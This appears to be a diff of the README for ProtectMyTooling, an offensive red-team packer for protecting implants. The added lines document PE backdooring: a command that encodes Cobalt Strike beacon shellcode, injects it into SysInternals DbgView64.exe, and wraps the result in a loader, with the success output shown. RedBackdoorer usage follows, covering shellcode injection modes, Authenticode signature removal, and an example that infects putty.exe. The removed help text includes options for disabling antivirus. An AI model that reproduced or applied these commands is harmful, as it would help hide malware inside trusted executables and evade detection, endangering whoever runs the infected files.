@@ -170,99 +170,9 @@ timestamp,filename,author,context,comment,md5,sha1,sha256,imphash
 ```
 
 
-### Other options include
-
-```
-C:\> py ProtectMyTooling.py --help
-
-    ::::::::::.:::::::..      ...  :::::::::::.,::::::  .,-::::::::::::::::
-     `;;;```.;;;;;;``;;;;  .;;;;;;;;;;;;;;;\''';;;;\'\''',;;;'````;;;;;;;;\'\'''
-      `]]nnn]]' [[[,/[[[' ,[[     \[[,  [[     [[cccc [[[           [[
-       $$$""    $$$$$$c   $$$,     $$$  $$     $$"""" $$$           $$
-       888o     888b "88bo"888,_ _,88P  88,    888oo,_`88bo,__,o,   88,
-    .  YMMMb :.-:.MM   ::-. "YMMMMMP"   MMM    """"YUMMM"YUMMMMMP"  MMM
-    ;;,.    ;;;';;.   ;;;;'
-    [[[[, ,[[[[, '[[,[[['
-    $$$$$$$$"$$$   c$$"
-    888 Y88" 888o,8P"`
-    ::::::::::::mM...        ...     :::    :::::.    :::. .,-:::::/
-    ;;;;;;;;\'''.;;;;;;;.  .;;;;;;;.  ;;;    ;;`;;;;,  `;;,;;-'````'
-         [[   ,[[     \[[,[[     \[[,[[[    [[[ [[[[[. '[[[[   [[[[[[/
-         $$   $$$,     $$$$$,     $$$$$'    $$$ $$$ "Y$c$"$$c.    "$$
-         88,  "888,_ _,88"888,_ _,88o88oo,._888 888    Y88`Y8bo,,,o88o
-         MMM    "YMMMMMP"  "YMMMMMP"""""YUMMMMM MMM     YM  `'YMUP"YMM
-
-    Red Team implants protection swiss knife.
-
-    Multi-Packer wrapping around multitude of packers, protectors, shellcode loaders, encoders.
-    Mariusz Banach / mgeeky '20-'22, <mb@binary-offensive.com>
-    v0.13
-
-usage: Usage: %prog [options] <packers> <infile> <outfile>
-
-positional arguments:
-  packers               Specifies packers to use and their order in a comma-delimited list. Example: "pecloak,upx" will produce upx(pecloak(file)) output.
-  infile                Input file to be packed/protected.
-  output                Output file constituing generated sample.
-
-options:
-  -h, --help            show this help message and exit
-  -c CONFIG, --config CONFIG
-                        External configuration file. Default: ProtectMyTooling.yaml
-  -t TIMEOUT, --timeout TIMEOUT
-                        Command execution timeout. Default: 60 seconds.
-  -a ARCH, --arch ARCH  Specify file's target architecture. If input is a valid PE file, this script will try to automatically sense its arch. Otherwise (shellcode) you'll need to specify it.
-  -v, --verbose         Displays verbose output.
-  -d, --debug           Displays debugging informations (implies verbose output).
-  -l PATH, --log PATH   Specifies output log file.
-  -s, --silent          Surpresses all of the output logging.
-  -C, --nocolors        Do not use colors in output.
-
-IOCs collection:
-  -i, --ioc             Collect IOCs and save them to .csv file side by side to <outfile>
-  --ioc-path IOC_PATH   Optional. Specify a path for the IOC file. By default will place outfile-ioc.csv side by side to generated output artifact.
-  -I CUSTOM_IOC, --custom-ioc CUSTOM_IOC
-                        Specify a custom IOC value that is to be written into output IOCs csv file in column "comment"
-
-Artifact Watermarking:
-  -w WHERE=STR [WHERE=STR ...], --watermark WHERE=STR [WHERE=STR ...]
-                        Inject watermark to generated artifact. Syntax: where=value, example: "-w dos-stub=Foobar". Available watermark places: dos-stub,checksum,overlay,section . Section requires NAME,STR syntax where NAME denotes PE section name, e.g. "-w section=.foo,bar" will create PE section named ".foo" with contents "bar". May be
-                        repeated.
-
-Test sample after generation:
-  -r, --testrun         Launch generated sample to test it. Use --cmdline to specify execution parameters. By default output won't be launched.
-  --cmdline CMDLINE     Command line for the generated sample
-
-Optional AV Handling hooks:
-  --check-av-command CHECK_AV_COMMAND
-                        Command used to check status of AV solution. This command must return "True" if AV is running.
-  --disable-av-command DISABLE_AV_COMMAND
-                        Command used to disable AV solution before processing files.
-  --enable-av-command ENABLE_AV_COMMAND
-                        Command used to re-enable AV solution after processing files. The AV will be re-enabled only if it was enabled previously.
-
-Packers handling:
-  -L, --list-packers    List available packers.
-
-PROTIP: Use "py ProtectMyTooling.py -h -v" to see all packer-specific options.
-```
-
 ## Supported Packers
 
 `ProtectMyTooling` was designed to support not only Obfuscators/Packers but also all sort of builders/generators/shellcode loaders usable from the command line.
-
-Each Packer plugin denotes its purpose by presenting itself with one of the enum values:
-
-```py
-class PackerType(Enum):
-    Unsupported          = 0
-    DotNetObfuscator     = 1
-    PEProtector          = 2
-    ShellcodeLoader      = 3
-    ShellcodeEncoder     = 4
-    PowershellObfuscator = 5
-    ShellcodeConverter   = 6
-```
 
 At the moment, program supports various Commercial and Open-Source packers/obfuscators. Those Open-Source ones are bundled within the project.
 Commercial ones will require user to purchase the product and configure its location in `ProtectMyTooling.yaml` file to point the script where to find them.
@@ -360,6 +270,37 @@ py RedWatermarker.py beacon-obf.exe -c 0xaabbccdd -t fooooobar -e bazbazbaz -s .
 Full watermarker usage:
 
 ```
+cmd> py RedWatermarker.py --help
+
+                      ;
+                      ED.
+                     ,E#Wi
+  j.               f#iE###G.
+  EW,            .E#t E#fD#W;
+  E##j          i#W,  E#t t##L
+  E###D.       L#D.   E#t  .E#K,
+  E#jG#W;    :K#Wfff; E#t    j##f
+  E#t t##f   i##WLLLLtE#t    :E#K:
+  E#t  :K#E:  .E#L    E#t   t##L
+  E#KDDDD###i   f#E:  E#t .D#W;                  ,;                                                      G:              ,;
+  E#f,t#Wi,,,    ,WW; E#tiW#G.                 f#i j.                                          j.        E#,    :      f#i j.
+  E#t  ;#W: ;     .D#;E#K##i .. GEEEEEEEL    .E#t  EW,                 ..       :           .. EW,       E#t  .GE    .E#t  EW,
+  DWi   ,K.DL       ttE##D. ;W, ,;;L#K;;.   i#W,   E##j               ,W,     .Et          ;W, E##j      E#t j#K;   i#W,   E##j
+  f.     :K#L     LWL E#t  j##,    t#E     L#D.    E###D.            t##,    ,W#t         j##, E###D.    E#GK#f    L#D.    E###D.
+  EW:   ;W##L   .E#f  L:  G###,    t#E   :K#Wfff;  E#jG#W;          L###,   j###t        G###, E#jG#W;   E##D.   :K#Wfff;  E#jG#W;
+  E#t  t#KE#L  ,W#;     :E####,    t#E   i##WLLLLt E#t t##f       .E#j##,  G#fE#t      :E####, E#t t##f  E##Wi   i##WLLLLt E#t t##f
+  E#t f#D.L#L t#K:     ;W#DG##,    t#E    .E#L     E#t  :K#E:    ;WW; ##,:K#i E#t     ;W#DG##, E#t  :K#E:E#jL#D:  .E#L     E#t  :K#E:
+  E#jG#f  L#LL#G      j###DW##,    t#E      f#E:   E#KDDDD###i  j#E.  ##f#W,  E#t    j###DW##, E#KDDDD###E#t ,K#j   f#E:   E#KDDDD###i
+  E###;   L###j      G##i,,G##,    t#E       ,WW;  E#f,t#Wi,,,.D#L    ###K:   E#t   G##i,,G##, E#f,t#Wi,,E#t   jD    ,WW;  E#f,t#Wi,,,
+  E#K:    L#W;     :K#K:   L##,    t#E        .D#; E#t  ;#W: :K#t     ##D.    E#t :K#K:   L##, E#t  ;#W: j#t          .D#; E#t  ;#W:
+  EG      LE.     ;##D.    L##,     fE          tt DWi   ,KK:...      #G      .. ;##D.    L##, DWi   ,KK: ,;            tt DWi   ,KK:
+  ;       ;@      ,,,      .,,       :                                j          ,,,      .,,
+
+
+    Watermark thy implants, track them in VirusTotal
+    Mariusz Banach / mgeeky '22, (@mariuszbit)
+    <mb@binary-offensive.com>
+
 usage: RedWatermarker.py [options] <infile>
 
 options:
@@ -414,6 +355,120 @@ They will contain following fields saved in form of a CSV file:
 
 Resulting will be a CSV file named `outfile-ioc.csv` stored side by side to generated output artifact. That file is written in APPEND mode, meaning it will receive all subsequent IOCs.
 
+
+## PE Backdooring
+
+`ProtectMyTooling` utilizes my own `RedBackdoorer.py` script which provides few methods for backdooring PE executables. 
+Support comes as a dedicated packer named `backdoor`. Example usage:
+
+**Takes Cobalt Strike shellcode on input and encodes with SGN (Shikata Ga-Nai) then backdoors SysInternals DbgView64.exe then produces Amber EXE reflective loader**
+
+```
+PS> py ProtectMyTooling.py sgn,backdoor,amber beacon64.bin dbgview64-infected.exe -B dbgview64.exe
+
+    ::::::::::.:::::::..      ...  :::::::::::.,::::::  .,-::::::::::::::::
+     `;;;```.;;;;;;``;;;;  .;;;;;;;;;;;;;;;;;;;,;;;'````;;;;;;;;
+      `]]nnn]]' [[[,/[[[' ,[[     \[[,  [[     [[cccc [[[           [[
+       $$$""    $$$$$$c   $$$,     $$$  $$     $$"""" $$$           $$
+       888o     888b "88bo"888,_ _,88P  88,    888oo,_`88bo,__,o,   88,
+    .  YMMMb :.-:.MM   ::-. "YMMMMMP"   MMM    """"YUMMM"YUMMMMMP"  MMM
+    ;;,.    ;;;';;.   ;;;;'
+    [[[[, ,[[[[, '[[,[[['
+    $$$$$$$$"$$$   c$$"
+    888 Y88" 888o,8P"`
+    ::::::::::::mM...        ...     :::    :::::.    :::. .,-:::::/
+    ;;;;;;;;.;;;;;;;.  .;;;;;;;.  ;;;    ;;`;;;;,  `;;,;;-'````'
+         [[   ,[[     \[[,[[     \[[,[[[    [[[ [[[[[. '[[[[   [[[[[[/
+         $$   $$$,     $$$$$,     $$$$$'    $$$ $$$ "Y$c$"$$c.    "$$
+         88,  "888,_ _,88"888,_ _,88o88oo,._888 888    Y88`Y8bo,,,o88o
+         MMM    "YMMMMMP"  "YMMMMMP"""""YUMMMMM MMM     YM  `'YMUP"YMM
+
+    Red Team implants protection swiss knife.
+
+    Multi-Packer wrapping around multitude of packers, protectors, shellcode loaders, encoders.
+    Mariusz Banach / mgeeky '20-'22, <mb@binary-offensive.com>
+    v0.13
+
+[.] Processing x64 file :  beacon64.bin
+[>] Generating output of sgn(<file>)...
+[>] Generating output of backdoor(sgn(<file>))...
+[>] Generating output of Amber(backdoor(sgn(<file>)))...
+
+[+] SUCCEEDED. Original file size: 265959 bytes, new file size Amber(backdoor(sgn(<file>))): 1372672, ratio: 516.12%
+```
+
+Full RedBackdoorer usage:
+
+```
+cmd> py RedBackdoorer.py --help
+
+     ██▀███ ▓█████▓█████▄
+    ▓██ ▒ ██▓█   ▀▒██▀ ██▌
+    ▓██ ░▄█ ▒███  ░██   █▌
+    ▒██▀▀█▄ ▒▓█  ▄░▓█▄   ▌
+    ░██▓ ▒██░▒████░▒████▓
+    ░ ▒▓ ░▒▓░░ ▒░ ░▒▒▓  ▒
+      ░▒ ░ ▒░░ ░  ░░ ▒  ▒
+      ░░   ░   ░   ░ ░  ░
+     ▄▄▄▄   ▄▄▄░  ░  ▄████▄  ██ ▄█▓█████▄ ▒█████  ▒█████  ██▀███ ▓█████ ██▀███
+    ▓█████▄▒████▄  ░▒██▀ ▀█  ██▄█▒▒██▀ ██▒██▒  ██▒██▒  ██▓██ ▒ ██▓█   ▀▓██ ▒ ██▒
+    ▒██▒ ▄█▒██  ▀█▄ ▒▓█    ▄▓███▄░░██   █▒██░  ██▒██░  ██▓██ ░▄█ ▒███  ▓██ ░▄█ ▒
+    ▒██░█▀ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄░▓█▄   ▒██   ██▒██   ██▒██▀▀█▄ ▒▓█  ▄▒██▀▀█▄
+    ░▓█  ▀█▓▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████▓░ ████▓▒░ ████▓▒░██▓ ▒██░▒████░██▓ ▒██▒
+    ░▒▓███▀▒▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒▒▒▓  ▒░ ▒░▒░▒░░ ▒░▒░▒░░ ▒▓ ░▒▓░░ ▒░ ░ ▒▓ ░▒▓░
+    ▒░▒   ░  ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ▒  ▒  ░ ▒ ▒░  ░ ▒ ▒░  ░▒ ░ ▒░░ ░  ░ ░▒ ░ ▒░
+     ░    ░  ░   ▒  ░       ░ ░░ ░ ░ ░  ░░ ░ ░ ▒ ░ ░ ░ ▒   ░░   ░   ░    ░░   ░
+     ░           ░  ░ ░     ░  ░     ░       ░ ░     ░ ░    ░       ░  ░  ░
+          ░         ░              ░
+
+
+    Your finest PE backdooring companion.
+    Mariusz Banach / mgeeky '22, (@mariuszbit)
+    <mb@binary-offensive.com>
+
+usage: peInjector.py [options] <mode> <shellcode> <infile>
+
+options:
+  -h, --help            show this help message and exit
+
+Required arguments:
+  mode                  PE Injection mode, see help epilog for more details.
+  shellcode             Input shellcode file
+  infile                PE file to backdoor
+
+Optional arguments:
+  -o PATH, --outfile PATH
+                        Path where to save output file with watermark injected. If not given, will modify infile.
+  -v, --verbose         Verbose mode.
+
+Backdooring options:
+  -n NAME, --section-name NAME
+                        If shellcode is to be injected into a new PE section, define that section name. Section name must not be longer than 7 characters. Default: .qcsw
+  -i IOC, --ioc IOC     Append IOC watermark to injected shellcode to facilitate implant tracking.
+
+Authenticode signature options:
+  -r, --remove-signature
+                        Remove PE Authenticode digital signature since its going to be invalidated anyway.
+
+------------------
+
+PE Backdooring <mode> consists of two comma-separated options.
+First one denotes where to store shellcode, second how to run it:
+
+<mode>
+
+    save,run
+      |   |
+      |   +---------- 1 - change AddressOfEntryPoint
+      |               2 - hijack branching instruction at Original Entry Point (jmp, call, ...)
+      |               3 - setup TLS callback
+      |
+      +-------------- 1 - store shellcode in the middle of a code section
+                      2 - append shellcode to the PE file in a new PE section
+Example:
+
+    py peInjector.py 1,2 beacon.bin putty.exe putty-infected.exe
+```
 
 ## Cobalt Strike Integration
 
